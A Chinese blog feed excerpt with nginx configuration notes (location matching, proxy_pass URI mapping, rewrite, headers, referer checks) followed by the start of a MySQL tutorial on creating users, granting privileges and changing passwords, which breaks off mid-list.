    <content><![CDATA[<p>最近经常用到nginx，所以想着系统的看一下常用的指令</p>
<h3 id="HttpCore指令集"><a href="#HttpCore指令集" class="headerlink" title="HttpCore指令集"></a>HttpCore指令集</h3><h4 id="server-name"><a href="#server-name" class="headerlink" title="server_name"></a>server_name</h4><p>含义：设置虚拟服务器的名字，第一个名字将成为主服务器名称；服务器名称可以使用*代替名称的第一部分或者最后一部分；也可以使用正则表达式进行捕获，目前不常用</p>
<p>示例</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">server_name</span> example.com <span class="regexp">*.example.com</span> <span class="regexp">www.example.*</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 使用正则</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">server_name</span> ~^(www\.)?(.+)$;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /sites/<span class="variable">$2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="location"><a href="#location" class="headerlink" title="location"></a>location</h4><p>含义：根据URI设置配置，可以使用合法的字符串或者正则表达式</p>
<p>语法：location [=|<del>|</del>*|^~] /uri/ { … }</p>
<p>上下文：server</p>
<table>
<thead>
<tr>
<th align="left">匹配符</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">=</td>
<td align="left">精确匹配</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">正则，大小写敏感</td>
</tr>
<tr>
<td align="left">~*</td>
<td align="left">正则，大小写不敏感</td>
</tr>
<tr>
<td align="left">^~</td>
<td align="left">前缀匹配</td>
</tr>
</tbody></table>
<p>示例</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> = /ceshi1/ &#123;</span><br><span class="line">    proxy\_pass http://127.0.0.1:7001/xxxx;</span><br><span class="line">    <span class="comment"># /ceshi1 -&gt; /xxxx</span></span><br><span class="line">    <span class="comment"># /ceshi1/a -&gt; 404 Not Found</span></span><br><span class="line">    <span class="comment"># /ceshi1a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /ceshi2/ &#123;</span><br><span class="line">    proxy\_pass http://127.0.0.1:7001/xxxx;</span><br><span class="line">    <span class="comment"># /ceshi2 -&gt; /xxxx</span></span><br><span class="line">    <span class="comment"># /ceshi2/a -&gt; /xxxxa</span></span><br><span class="line">    <span class="comment"># /ceshi2a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="常用变量"><a href="#常用变量" class="headerlink" title="常用变量"></a>常用变量</h4><table>
<thead>
<tr>
<th align="left">变量名</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">$arg_PARAMETER</td>
<td align="left">GET请求的参数，PARAMETER为参数名</td>
</tr>
<tr>
<td align="left">args/query_string</td>
<td align="left">GET请求的query_string，比如/test?xxxx=ceshi1&amp;yyyy=ceshi2，则args_xxxx 为 ceshi1</td>
</tr>
<tr>
<td align="left">$content_type</td>
<td align="left">请求头Content-Type</td>
</tr>
<tr>
<td align="left">$cookie_COOKIE</td>
<td align="left">名称为COOKIE的cookie</td>
</tr>
<tr>
<td align="left">$host</td>
<td align="left">按照以下优先顺序：来自请求行的主机名，来自 Host 请求头字段的主机名，或与请求匹配的服务器名</td>
</tr>
<tr>
<td align="left">$https</td>
<td align="left">如果连接以 SSL 模式运行，则为 on，否则为空字符串</td>
</tr>
<tr>
<td align="left">$is_args</td>
<td align="left">如果请求行有参数则为 ?，否则为空字符串</td>
</tr>
<tr>
<td align="left">$http_HEADER</td>
<td align="left">获取请求头字段，注意要将中划线给为下划线，示例为http_referer</td>
</tr>
<tr>
<td align="left">$remote_addr</td>
<td align="left">客户端地址</td>
</tr>
<tr>
<td align="left">$remote_port</td>
<td align="left">客户端端口</td>
</tr>
<tr>
<td align="left">$request_method</td>
<td align="left">请求方法</td>
</tr>
<tr>
<td align="left">$request_uri</td>
<td align="left">完整的原始请求URI(带参数)</td>
</tr>
<tr>
<td align="left">$scheme</td>
<td align="left">请求模式，http或https</td>
</tr>
<tr>
<td align="left">$status</td>
<td align="left">响应状态</td>
</tr>
<tr>
<td align="left">document_uri</td>
<td align="left">请求的url path，可能和初始不同，比如使用rewrite</td>
</tr>
</tbody></table>
<h3 id="HttpUpstream指令集"><a href="#HttpUpstream指令集" class="headerlink" title="HttpUpstream指令集"></a>HttpUpstream指令集</h3><p>该模块用于定义可被proxy_pass等指令应用的服务器组</p>
<h4 id="upstream"><a href="#upstream" class="headerlink" title="upstream"></a>upstream</h4><p>含义：定义一组服务器，服务器可以监听不同端口。</p>
<p>示例</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">upstream</span> backend &#123;</span><br><span class="line">    <span class="attribute">server</span> backend1.example.com weight=<span class="number">5</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:8080</span>       max_fails=<span class="number">3</span> fail_timeout=<span class="number">30s</span>;</span><br><span class="line">    <span class="attribute">server</span> unix:/tmp/backend3;</span><br><span class="line"> </span><br><span class="line">    <span class="attribute">server</span> backup1.example.com  backup;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>默认情况下，使用加权轮询均衡算法在服务器间分配请求。在上面的示例中，每 7 个请求将按如下方式分发：5 个请求转到 <code>backend1.example.com</code>，另外 2 个请求分别转发给第二个和第三个服务器。如果在与服务器通信期间发生错误，请求将被传递到下一个服务器，依此类推，直到尝试完所有正常运行的服务器。如果无法从这些服务器中获得成功响应，则客户端将接收到与最后一个服务器的通信结果。</p>
<h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><p>含义：定义服务器地址和其他参数</p>
<h3 id="HttpRewrite指令集"><a href="#HttpRewrite指令集" class="headerlink" title="HttpRewrite指令集"></a>HttpRewrite指令集</h3><h4 id="rewrite"><a href="#rewrite" class="headerlink" title="rewrite"></a>rewrite</h4><p>含义：根据正则表达式修改URL或者修改字符串，注意，重写表达式只对相对路径有效，如果你想匹配主机名，应该使用if语句</p>
<p>使用位置：server或者location或者if</p>
<p>语法：rewrite regex replacement flag</p>
<p><em>关于flag</em></p>
<table>
<thead>
<tr>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">last</td>
<td align="left">停止当前请求，并根据该次修改重新发起请求，然后走一遍这个配置文件</td>
</tr>
<tr>
<td align="left">break</td>
<td align="left">替换后继续往下执行指令(完成rewrite指令集)</td>
</tr>
<tr>
<td align="left">redirect</td>
<td align="left">临时重定向，返回302</td>
</tr>
<tr>
<td align="left">permanent</td>
<td align="left">永久重定向，返回301</td>
</tr>
</tbody></table>
<p><em>关于参数</em></p>
<p>如果不想让匹配的内容的参数附在重定向的后面，则在最后加一个问号，如下</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rewrite</span> <span class="regexp"> ^/users/(.*)$</span>  /show?user=<span class="variable">$1</span>?  <span class="literal">last</span>;</span><br></pre></td></tr></table></figure>

<p><em>工程示例</em></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rewrite</span> ./test/index.html <span class="literal">break</span>; <span class="comment"># 转发所有的请求给index.html页面，并完成所有的rewrite指令集</span></span><br></pre></td></tr></table></figure>

<h4 id="break"><a href="#break" class="headerlink" title="break"></a>break</h4><p>含义：完成所有的rewrite指令集</p>
<p>使用位置：server,location,if</p>
<h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><p>含义：逻辑判断</p>
<p>使用位置：server,location</p>
<p>语法：if(condition){}</p>
<p>比较符</p>
<table>
<thead>
<tr>
<th align="left">符号</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">=</td>
<td align="left">相等</td>
</tr>
<tr>
<td align="left">!=</td>
<td align="left">不等</td>
</tr>
<tr>
<td align="left">~*</td>
<td align="left">正则匹配，大小写不敏感</td>
</tr>
<tr>
<td align="left">~</td>
<td align="left">正则匹配，大小写敏感</td>
</tr>
<tr>
<td align="left">!~*</td>
<td align="left">不符合，大小写不敏感</td>
</tr>
<tr>
<td align="left">!~</td>
<td align="left">不符合，大小写敏感</td>
</tr>
<tr>
<td align="left">-f and !-f</td>
<td align="left">判断文件存在或者不存在</td>
</tr>
<tr>
<td align="left">-d and !-d</td>
<td align="left">检测一个目录是否存在</td>
</tr>
<tr>
<td align="left">-e and !-e</td>
<td align="left">检测是否存在一个文件，一个目录或者一个符号链接</td>
</tr>
<tr>
<td align="left">-x and !-x</td>
<td align="left">检测一个文件是否可执行</td>
</tr>
</tbody></table>
<p>示例</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">set</span> <span class="variable">$xsrfToken</span> <span class="string">""</span>;</span><br><span class="line">if ($http_cookie ~* "XSRF-TOKEN=(.+?)(?=;|$)")&#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$xsrfToken</span> <span class="variable">$1</span>; <span class="comment"># 设置变量xsrfToken为cookie中匹配到的值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>含义：设置变量的值</p>
<p>使用位置(上下文)：server,location,if</p>
<p>示例：如上</p>
<h4 id="return"><a href="#return" class="headerlink" title="return"></a>return</h4><p>含义：返回一个状态值给客户端</p>
<p>使用位置(上下文)：server,location,if</p>
<p>示例：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$invalid_referer</span>) &#123; <span class="comment"># 检测到Referers不合法，则禁止访问，返回403</span></span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HttpProxy指令集"><a href="#HttpProxy指令集" class="headerlink" title="HttpProxy指令集"></a>HttpProxy指令集</h3><h4 id="proxy-pass"><a href="#proxy-pass" class="headerlink" title="proxy_pass"></a>proxy_pass</h4><p>含义：设置代理服务器的协议、地址以及映射位置的可选URL，协议可以指定http或https，可以将地址指定为域名或IP地址，以及一个可选端口号；如果域名解析为多个地址，则所有这些地址将以轮询方式使用；可以将地址指定为upstream</p>
<p>使用位置: http -&gt; server -&gt; location</p>
<p>语法：proxy_pass URL</p>
<p>转发时，URI的传递方式如下</p>
<ul>
<li>如果proxy_pass指定了URI，则转发时会将location匹配的规则部分替换为URI部分</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /name/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1/remote/; <span class="comment"># http://a.com/name/test -&gt; http://127.0.0.1/remote/test</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果proxy_pass没有指定URI，则请求URL将会以location匹配为准，示例如下</li>
</ul>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /xxxx &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1; <span class="comment"># 将http://a.com/xxxx/test -&gt; http://127.0.0.1/xxxx/test</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例外情况，无法确定怎么替换URI</p>
<ul>
<li>location使用正则匹配，proxy_pass不使用URI</li>
<li>使用rewrite，将忽略proxy_pass中的URI</li>
</ul>
<h4 id="proxy-set-header"><a href="#proxy-set-header" class="headerlink" title="proxy_set_header"></a>proxy_set_header</h4><p>含义：设置请求头内容</p>
<p>语法：proxy_set_header header value</p>
<p>使用位置：http,server,location</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_set_header</span> X-XSRF-TOKEN <span class="variable">$xsrfToken</span>;</span><br></pre></td></tr></table></figure>

<h4 id="proxy-connect-timeout"><a href="#proxy-connect-timeout" class="headerlink" title="proxy_connect_timeout"></a>proxy_connect_timeout</h4><p>含义：定义与代理服务器建立连接的超时时间，注意，次超时时间通常不会超过75s</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_connect_timeout</span> <span class="number">60</span>;</span><br></pre></td></tr></table></figure>

<h4 id="proxy-send-timeout"><a href="#proxy-send-timeout" class="headerlink" title="proxy_send_timeout"></a>proxy_send_timeout</h4><p>含义：设置将请求传输到代理服务器的超时时间。超时时间仅作用于两个连续的写操作之间，而不是整个请求的传输过程。如果代理服务器在该时间内未收到任何内容，则关闭连接。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_send_timeout</span> <span class="number">60</span>;</span><br></pre></td></tr></table></figure>

<h4 id="proxy-read-timeout"><a href="#proxy-read-timeout" class="headerlink" title="proxy_read_timeout"></a>proxy_read_timeout</h4><p>含义：定义从代理服务器读取响应的超时时间。该超时时间仅针对两个连续的读操作之间设置，而不是整个响应的传输过程。如果代理服务器在该时间内未传输任何内容，则关闭连接。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">proxy_read_timeout</span> <span class="number">60</span>;</span><br></pre></td></tr></table></figure>

<h3 id="HttpHeaders指令集"><a href="#HttpHeaders指令集" class="headerlink" title="HttpHeaders指令集"></a>HttpHeaders指令集</h3><h4 id="add-header"><a href="#add-header" class="headerlink" title="add_header"></a>add_header</h4><p>含义：增加响应头内容</p>
<p>使用位置: http -&gt; server -&gt; location</p>
<p>语法： add_header name value;</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Cache-Control <span class="string">'no-store'</span>; <span class="comment"># 设置所有内容不会被缓存</span></span><br></pre></td></tr></table></figure>

<h4 id="expires"><a href="#expires" class="headerlink" title="expires"></a>expires</h4><p>含义：增加响应头Expires字段，便于确定缓存时间</p>
<p>使用位置：http -&gt; server -&gt; location</p>
<p>语法：expires [time|epoch|max|off]</p>
<table>
<thead>
<tr>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">time</td>
<td align="left">数量</td>
</tr>
<tr>
<td align="left">epoch</td>
<td align="left">1 January, 1970, 00:00:01 GMT</td>
</tr>
<tr>
<td align="left">max</td>
<td align="left">Cache-Control值为10年，Expires为31 December 2037 23:59:59 GMT</td>
</tr>
<tr>
<td align="left">off</td>
<td align="left">【默认值】不使用时间</td>
</tr>
</tbody></table>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">expires</span> <span class="literal">off</span>; <span class="comment">#不使用过期时间</span></span><br></pre></td></tr></table></figure>

<p>注意1：优先级 强缓存优先级 &gt; 对比缓存优先级 ；对于强缓存优先级，pragma &gt; Cache-Control &gt; Expires；对于对比缓存优先级，ETag &gt; Last-Modified</p>
<p>注意2：Cache-Control是http1.1的头字段，Expires是http1.0的头字段，建议两者都写</p>
<p>注意3：Cache-Control默认值为private，其他细节不赘述</p>
<p>细节参考：<a href="https://www.imooc.com/article/22841" target="_blank" rel="noopener">https://www.imooc.com/article/22841</a></p>
<h3 id="HttpReferer指令集"><a href="#HttpReferer指令集" class="headerlink" title="HttpReferer指令集"></a>HttpReferer指令集</h3><h4 id="valid-referers"><a href="#valid-referers" class="headerlink" title="valid_referers"></a>valid_referers</h4><p>含义：判断请求头Referers的正确性，结果会赋值给$invalid_referer</p>
<p>使用位置：http -&gt; server -&gt; location</p>
<p>语法：valid_referers [none|blocked|server_names]</p>
<table>
<thead>
<tr>
<th align="left">值</th>
<th align="left">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="left">none</td>
<td align="left">无Referer，一般直接刷新会是如此</td>
</tr>
<tr>
<td align="left">blocked</td>
<td align="left">有，但是被删除，这些值不以http://或者https://开头</td>
</tr>
<tr>
<td align="left">server_names</td>
<td align="left">写一个匹配的路径规则，要带域名，会从scheme后面开始匹配，端口也会忽略，写正则以~开头</td>
</tr>
</tbody></table>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /views &#123;</span><br><span class="line">    <span class="attribute">valid_referers</span> <span class="regexp">*.com</span>/chart/; <span class="comment">#判断Referer是否匹配给出的路径，匹配则$invalid_referer为false，否则为true</span></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$invalid_referer</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 如果Referer为a.com/chart/1则符合规则，如果为a.com/chart则不符合，如果没有referer也不符合</span></span><br></pre></td></tr></table></figure>

<h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><h4 id="location-proxy-pass-rewrite对比使用总结"><a href="#location-proxy-pass-rewrite对比使用总结" class="headerlink" title="location/proxy_pass/rewrite对比使用总结"></a>location/proxy_pass/rewrite对比使用总结</h4><p>将location和proxy_pass的所有匹配情况测试结果放在下面，对应关系为【访问path -&gt; 转发成的path】</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /test1 &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/;</span><br><span class="line">    <span class="comment"># /test1 -&gt; /</span></span><br><span class="line">    <span class="comment"># /test1/a -&gt; //a</span></span><br><span class="line">    <span class="comment"># /test1a -&gt; /a</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test2 &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/xxxx;</span><br><span class="line">    <span class="comment"># /test2 -&gt; /xxxx</span></span><br><span class="line">    <span class="comment"># /test2/a -&gt; /xxxx/a</span></span><br><span class="line">    <span class="comment"># /test2a -&gt; /xxxxa</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test3 &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/xxxx/;</span><br><span class="line">    <span class="comment"># /test3 -&gt; /xxxx//</span></span><br><span class="line">    <span class="comment"># /test3/a -&gt; /xxxx//a</span></span><br><span class="line">    <span class="comment"># /test3a -&gt; /xxxx/a</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test4 &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001;</span><br><span class="line">    <span class="comment"># /test4 -&gt; /test4</span></span><br><span class="line">    <span class="comment"># /test4/a -&gt; /test4/a</span></span><br><span class="line">    <span class="comment"># /test4a -&gt; /xxxx4a</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test5/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/;</span><br><span class="line">    <span class="comment"># /test5 -&gt; /</span></span><br><span class="line">    <span class="comment"># /test5/a -&gt; /a</span></span><br><span class="line">    <span class="comment"># /test5a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test6/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/xxxx;</span><br><span class="line">    <span class="comment"># /test6 -&gt; /xxxx</span></span><br><span class="line">    <span class="comment"># /test6/a -&gt; /xxxxa</span></span><br><span class="line">    <span class="comment"># /test6a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test7/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/xxxx/;</span><br><span class="line">    <span class="comment"># /test7 -&gt; /xxxx/</span></span><br><span class="line">    <span class="comment"># /test7/a -&gt; /xxxx/a</span></span><br><span class="line">    <span class="comment"># /test7a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test8/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001;</span><br><span class="line">    <span class="comment"># /test8 -&gt; /test8/</span></span><br><span class="line">    <span class="comment"># /test8/a -&gt; /test8/a</span></span><br><span class="line">    <span class="comment"># /test8a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> /test9/ &#123;</span><br><span class="line">    <span class="attribute">rewrite</span> . /b <span class="literal">break</span>;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/xxxx;</span><br><span class="line">    <span class="comment"># /test9 -&gt; /b</span></span><br><span class="line">    <span class="comment"># /test9/a -&gt; /b</span></span><br><span class="line">    <span class="comment"># /test9a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~* /test10(.*)/</span> &#123;</span><br><span class="line">    <span class="comment">#proxy_pass http://127.0.0.1:7001/xxxx;</span></span><br><span class="line">    <span class="comment"># nginx无法执行通过，会报错，不能带URI</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">location</span> = /ceshi1/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/xxxx;</span><br><span class="line">    <span class="comment"># /ceshi1 -&gt; /xxxx</span></span><br><span class="line">    <span class="comment"># /ceshi1/a -&gt; 404 Not Found</span></span><br><span class="line">    <span class="comment"># /ceshi1a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">location</span><span class="regexp"> ^~</span> /ceshi2/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> http://127.0.0.1:7001/xxxx;</span><br><span class="line">    <span class="comment"># /ceshi2 -&gt; /xxxx</span></span><br><span class="line">    <span class="comment"># /ceshi2/a -&gt; /xxxxa</span></span><br><span class="line">    <span class="comment"># /ceshi2a -&gt; 404 Not Found</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>Mysql创建新用户方法</title>
    <url>/articles/Mysql%E5%88%9B%E5%BB%BA%E6%96%B0%E7%94%A8%E6%88%B7%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h4 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h4><p>语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'username'</span>@<span class="string">'host'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'password'</span>;</span><br></pre></td></tr></table></figure>

<p>例子:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'dog'</span>@<span class="string">'localhost'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'123456'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'cat'</span>@<span class="string">'192.168.1.101_'</span> IDENDIFIED <span class="keyword">BY</span> <span class="string">'123456'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'cat'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'123456'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'cat'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'cat'</span>@<span class="string">'%'</span>;</span><br></pre></td></tr></table></figure>

<p>实例1：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;  create user ms ;</span><br></pre></td></tr></table></figure>

<p>这样创建的用户，可以从任意安装了mysql客户端，并能够访问目标服务器的机器上创建连接，无须密码.例如，从ip:10.0.0.99的客户端执行连接：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql -ums  -h 172.16.1.110</span><br></pre></td></tr></table></figure>

<p>查看该用户：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;  select user,host,password from user where user='ms ';</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">USER</span>();    //显示当前用户</span><br></pre></td></tr></table></figure>

<p>实例2：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;  create user ms _ps identified by 'ms ';</span><br></pre></td></tr></table></figure>

<p>用户连接时，必须指定密码，那就可以在创建用户时，通过指定identified by子句来设定密码</p>
<p>用密码登陆：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql -ums _ps -p -h 172.16.1.110</span><br></pre></td></tr></table></figure>

<p>如果希望指定的用户只能从某台指定的域(domain)或主机访问，可以在创建用户时指定host，例如，指定用户只能从10.0.0.99访问</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;  create user ms _ip@10.0.0.99 identified by password '123456';</span><br></pre></td></tr></table></figure>

<h4 id="用户访问授权"><a href="#用户访问授权" class="headerlink" title="用户访问授权"></a>用户访问授权</h4><p>语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> 权限<span class="number">1</span>,权限<span class="number">2</span>,...权限n <span class="keyword">on</span> 数据库名称.表名称 <span class="keyword">to</span> 用户名@用户地址 <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'连接口令'</span>;</span><br></pre></td></tr></table></figure>

<p>权限1,权限2,…权限n代表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span>,<span class="keyword">insert</span>,<span class="keyword">update</span>,<span class="keyword">delete</span>,<span class="keyword">create</span>,<span class="keyword">drop</span>,<span class="keyword">index</span>,<span class="keyword">alter</span>,<span class="keyword">grant</span>,<span class="keyword">references</span>,reload,<span class="keyword">shutdown</span>,process,<span class="keyword">file</span>等<span class="number">14</span>个权限</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant select,insert,update,delete,create,drop on vtdc.employee to joe@10.163.225.87 identified by '123';</span><br></pre></td></tr></table></figure>

<p>给来自10.163.225.87的用户joe分配可对数据库vtdc的employee表进行select,insert,update,delete,create,drop等操作的权限，并设定口令为123。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant all privileges on vtdc.* to joe@10.163.225.87 identified by '123';</span><br></pre></td></tr></table></figure>

<p>给来自10.163.225.87的用户joe分配可对数据库vtdc所有表进行所有操作的权限，并设定口令为123。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant all privileges on *.* to joe@10.163.225.87 identified by '123';</span><br></pre></td></tr></table></figure>

<p>给来自10.163.225.87的用户joe分配可对所有数据库的所有表进行所有操作的权限，并设定口令为123。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; grant all privileges on *.* to joe@localhost identified by '123';</span><br></pre></td></tr></table></figure>

<p>给本机用户joe分配可对所有数据库的所有表进行所有操作的权限，并设定口令为123。</p>
<h4 id="直接向mysql-user表插入记录"><a href="#直接向mysql-user表插入记录" class="headerlink" title="直接向mysql.user表插入记录"></a>直接向mysql.user表插入记录</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; insert into user (host,user,password) values ('%','ms _insert',password('ms '));</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;   //刷新系统权限表</span><br></pre></td></tr></table></figure>

<h4 id="修改mysql用户密码方式"><a href="#修改mysql用户密码方式" class="headerlink" title="修改mysql用户密码方式"></a>修改mysql用户密码方式</h4><ul>
<li>使用mysqladmin语法：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqladmin -u用户名 -p旧密码 password 新密码</span><br></pre></td></tr></table></figure>

<p>例如：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root -p 123 password 456；</span><br></pre></td></tr></table></figure>

<ul>
<li>直接修改user表的用户口令：</li>
</ul>
<p>语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'新密码'</span>) <span class="keyword">where</span> <span class="keyword">User</span>=<span class="string">"root"</span> <span class="keyword">and</span> Host=<span class="string">"localhost"</span>;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'123456'</span>) <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用SET PASSWORD语句修改密码：语法：</li>
</ul>
